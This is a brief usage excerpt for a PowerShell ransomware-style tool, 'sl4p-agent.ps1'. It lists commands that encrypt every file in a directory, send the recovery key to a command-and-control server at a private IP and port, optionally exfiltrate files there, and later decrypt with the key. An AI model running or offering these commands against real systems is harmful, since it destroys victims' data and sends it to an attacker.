.\sl4p-agent.ps1 -e Directory -s 10.1.0.13 -p 8443 -x
          Encrypt all files & sends recovery key to C2Server
          Use -x to exfiltrate and decrypt files on C2Server

        .\sl4p-agent.ps1 -d Directory -k RecoveryKey
          Decrypt all files with recovery key string
